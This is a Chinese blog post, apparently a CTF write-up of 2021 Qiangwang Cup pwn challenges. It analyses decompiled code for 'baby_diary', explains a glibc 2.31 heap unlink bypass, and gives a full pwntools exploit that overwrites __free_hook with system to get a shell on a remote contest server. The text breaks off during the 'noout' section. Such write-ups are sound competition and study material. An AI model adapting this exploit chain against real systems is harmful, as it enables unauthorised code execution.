<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>2021 强网杯PWN部分WP | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":"search.json"}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
 startOnLoad: true
 , theme: 'dark'
});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(/img/bg.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>2021 强网杯PWN部分WP</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-06-25T15:24:00.000Z" id="date"> 2021-06-25</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-10-07T08:17:07.910Z" id="updated"> 2024-10-07</time></div></span><br><span>Word Count: <div class="control">6.2k</div></span><br><span>Read Time: <div class="control">34 min</div></span></div></div><hr><div id="post-content"><h1 id="2021-强网杯PWN-部分WP"><a href="#2021-强网杯PWN-部分WP" class="headerlink" title="2021 强网杯PWN 部分WP"></a>2021 强网杯PWN 部分WP</h1><p>最终官方排名:23</p>
<h2 id="baby-diary"><a href="#baby-diary" class="headerlink" title="baby_diary"></a>baby_diary</h2><p>漏洞点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_132B</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">char</span> a3)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)(i + a1), <span class="hljs-number">1uLL</span>) &lt;= <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;read error&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( a3 == *(_BYTE *)(i + a1) )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;                      <span class="hljs-comment">//设置最后一个至为0</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>执行完编辑函数，可以修改最后一个字节的low_byte位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sub_1528</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> n)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( idx &lt;= <span class="hljs-number">0x18</span> &amp;&amp; bufs[idx] )<br>  &#123;<br>    v2 = bufs[idx];<br>    flags[idx] = n;<br>    <span class="hljs-keyword">if</span> ( n )<br>      *(_BYTE *)(n + <span class="hljs-number">1LL</span> + v2) = (*(_BYTE *)(n + <span class="hljs-number">1LL</span> + v2) &amp; <span class="hljs-number">0xF0</span>) + sub_146E(idx); <span class="hljs-comment">// n若为开辟内存大小的话，存在溢出， 修改低4位</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>然而sub_146E函数根据下面算法计算的，若大于0x0f的话，就不能构造结果为0，这有点坑。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_146E</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">0x18</span> || !bufs[a1] )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>LL;<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; flags[a1]; ++i )<br>    v3 += *(<span class="hljs-type">unsigned</span> __int8 *)(i + bufs[a1]);<br>  <span class="hljs-keyword">while</span> ( v3 &gt; <span class="hljs-number">0xF</span> )<br>    v3 = (v3 &gt;&gt; <span class="hljs-number">4</span>) + (v3 &amp; <span class="hljs-number">0xF</span>);<br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>漏洞综述，最后字节用’\x00’截断，4bit位溢出。</p>
<p>glibc 2.31下绕过unlink，稍微有点难构造，加上本身程序逻辑，更难构造了，各种层层构造关联太强了，但最后还是找的了某些地址，成功构造利用链子，这需要控制很好的地址的值，比如实现unlink时，prev_size 要满足 0x100的倍数，不然不好设置我们unlink chunk size低3位为 0，还有构造unlink的fd-&gt;bk 指向自己本身，bk-&gt;fd指向自己本身，然而程序有点烦人的是最后一字节为’\x00’截断的，后面有4bit位溢出，这使得我们伪造chunk的fd必需要为0x100的整数倍才行。实现unlink之后就实现了堆重叠，泄漏Libc然后再修改<code>__free_hook</code>为system函数，至于glibc 2.31下如何绕过unlink，它与2.29一样的，多了个 prev_size &#x3D;&#x3D; chunk_size的检查，这就比较麻烦， 可以参考这篇博客:<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-257901-1.htm">https://bbs.pediy.com/thread-257901-1.htm</a> 。</p>
<p>下面是我重重构造，实现unlink的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x5555dc297300 —▸ 0x5555dc297dd0 —▸ 0x7f8e6ac39ca0 (main_arena+96) ◂— 0x5555dc29730<br></code></pre></td></tr></table></figure>



<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-comment"># ref: https://bbs.pediy.com/thread-257901-1.htm</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./baby_diary&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;8.140.114.72:1399&quot;</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">sz, d</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>    <span class="hljs-keyword">if</span>(sz &gt; <span class="hljs-number">0</span>):<br>        sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 0-6</span><br>        ad(<span class="hljs-number">0x1000</span>, <span class="hljs-string">&quot;padding\n&quot;</span>)<br><br>    <span class="hljs-comment">#ad(0x1000-0x210 + 0x70 , &quot;padding\n&quot;) # 7 glibc 2.29</span><br>    ad(<span class="hljs-number">0x1000</span>-<span class="hljs-number">0x210</span> + <span class="hljs-number">0x70</span> -<span class="hljs-number">0x40</span>, <span class="hljs-string">&quot;padding\n&quot;</span>) <span class="hljs-comment"># 7 glibc 2.31</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 8-14</span><br>        ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;t\n&#x27;</span>)<br><br>    ad(<span class="hljs-number">0x1b20</span>, <span class="hljs-string">&quot;largebin\n&quot;</span>) <span class="hljs-comment"># 15</span><br>    ad(<span class="hljs-number">0x20</span>, <span class="hljs-string">&quot;padding\n&quot;</span>) <span class="hljs-comment"># 16</span><br>    rm(<span class="hljs-number">15</span>)<br><br>    ad(<span class="hljs-number">0x2000</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 15</span><br>    ad(<span class="hljs-number">0x28</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># idx:17 get a chunk from largebin</span><br><br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;a\n&#x27;</span>) <span class="hljs-comment"># 18</span><br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;b\n&#x27;</span>) <span class="hljs-comment"># 19</span><br>    ad(<span class="hljs-number">0x38</span> + <span class="hljs-number">0x300</span>, <span class="hljs-string">&#x27;c\n&#x27;</span>) <span class="hljs-comment"># 20</span><br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;d\n&#x27;</span>) <span class="hljs-comment"># 21</span><br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;e\n&#x27;</span>) <span class="hljs-comment"># 22 for not merge</span><br>     <br>    <span class="hljs-comment"># fill in tcache_entry[1](size: 0x30)</span><br>    t = <span class="hljs-number">9</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 8-14</span><br>        rm(<span class="hljs-number">8</span> + i)<br>    rm(<span class="hljs-number">18</span>) <span class="hljs-comment"># t</span><br>    rm(<span class="hljs-number">20</span>)<br>    rm(<span class="hljs-number">21</span>)<br><br>    <span class="hljs-comment"># clear tcache_entry[1](size: 0x30)</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 8-14</span><br>        ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-comment"># fastbin to smallbin</span><br>    ad(<span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">#18</span><br><br>    <span class="hljs-comment"># get a chunk from smallbin , another smallbin chunk to tcache</span><br>    <span class="hljs-comment"># 20, change fake chunk&#x27;s fd-&gt;bk to point to fake chunk</span><br>    ad(<span class="hljs-number">0x28</span>,  <span class="hljs-string">b&#x27;\x03&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-comment"># clear chunk from tcache</span><br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;clear\n&#x27;</span>) <span class="hljs-comment"># 21</span><br>     <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 8-14</span><br>        rm(<span class="hljs-number">8</span> + i)<br>              <br>    <span class="hljs-comment"># free to fastbin</span><br>    rm(<span class="hljs-number">19</span>)<br>    rm(<span class="hljs-number">17</span>)<br>               <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 8-14</span><br>        ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                        <br>    <span class="hljs-comment"># change fake chunk&#x27;s bk-&gt;fd</span><br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># 17</span><br><br><br>    <span class="hljs-comment"># Make house of einherjar</span><br>    rm(<span class="hljs-number">18</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>): <span class="hljs-comment"># 8-14</span><br>        rm(<span class="hljs-number">8</span> + i)<br><br>    ad(<span class="hljs-number">0x170</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 8</span><br>    ad(<span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 9</span><br>    ad(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)  <span class="hljs-comment"># 10</span><br>    <br>    rm(<span class="hljs-number">8</span>)<br>    ad(<span class="hljs-number">0x177</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x177</span>) <span class="hljs-comment"># 8</span><br>    rm(<span class="hljs-number">8</span>)<br>    ad(<span class="hljs-number">0x177</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x16f</span>) + <span class="hljs-string">b&#x27;\x06&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># 8</span><br>    <span class="hljs-comment"># unlink</span><br>    rm(<span class="hljs-number">9</span>)<br><br>    <span class="hljs-comment"># leak libc </span><br>    ad(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment"># 9</span><br>    dp(<span class="hljs-number">22</span>) <br>    leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x10</span> - <span class="hljs-number">96</span><br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    <span class="hljs-comment">#ad(0x17, p64(free_hook) + b&#x27;\n&#x27;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>        <br>    rm(<span class="hljs-number">20</span>) <span class="hljs-comment"># </span><br><br>    rm(<span class="hljs-number">0</span>) <span class="hljs-comment"># for clean</span><br>    rm(<span class="hljs-number">1</span>) <span class="hljs-comment"># for clean</span><br><br>    ad(<span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;/bin/sh\n&#x27;</span>)<br><br>    rm(<span class="hljs-number">9</span>) <span class="hljs-comment">#</span><br>    ad(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x400</span> + p64(free_hook) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <br>    ad(<span class="hljs-number">0x28</span>, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    ad(<span class="hljs-number">0x28</span>, p64(system) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    db()<br>    rm(<span class="hljs-number">0</span>)<br><br><br>    <span class="hljs-comment"># double free</span><br>    <span class="hljs-comment">#rm(0)</span><br><br><br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    rm(9)</span><br><span class="hljs-string">    ad(0x37, b&#x27;\x00&#x27; + b&#x27;\x00&#x27; * 0x30 + b&#x27;\x50&#x27; + b&#x27;\n&#x27;)</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> LOCAL:<br>        elf = ELF(elf_path)<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>        io = elf.process()<br>    <span class="hljs-keyword">else</span>:<br>        elf = ELF(elf_path)<br>        io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>    exploit()<br>    finish()<br><br></code></pre></td></tr></table></figure>







<h2 id="noout"><a href="#noout" class="headerlink" title="noout"></a>noout</h2><p>没有打印函数，通过’\x00’字节绕过字符串比较</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">__sighandler_t</span> <span class="hljs-title function_">sub_8049424</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">__sighandler_t</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// [esp+5Ch] [ebp-Ch]</span><br><br>  init_();<br>  v3 = <span class="hljs-string">&quot;tell me some thing&quot;</span>;<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>u);<br>  v3 = <span class="hljs-string">&quot;Tell me your name:\n&quot;</span>;<br>  read(<span class="hljs-number">0</span>, src, <span class="hljs-number">0x20</span>u);<br>  sub_80493EC(src);<br>  <span class="hljs-built_in">strcpy</span>(dest, src);<br>  v3 = <span class="hljs-string">&quot;now give you the flag\n&quot;</span>;<br>  read(unk_804C080, src, <span class="hljs-number">0x10</span>u);<br>  result = (<span class="hljs-type">__sighandler_t</span>)str_cmp(src, off_804C034);<span class="hljs-comment">// 字符串比较</span><br>  <span class="hljs-keyword">if</span> ( !result )<br>    result = sub_8049269();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>再利用计算错误抛出SIGFPE信号使调用漏洞函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">__sighandler_t</span> <span class="hljs-title function_">sub_8049269</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">__sighandler_t</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">void</span> (*v1)(<span class="hljs-type">int</span>); <span class="hljs-comment">// [esp+0h] [ebp-18h] BYREF</span><br>  <span class="hljs-type">int</span> v2[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+4h] [ebp-14h] BYREF</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = <span class="hljs-string">&quot;give me the soul:&quot;</span>;<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v2);<br>  v3 = <span class="hljs-string">&quot;give me the egg:&quot;</span>;<br>  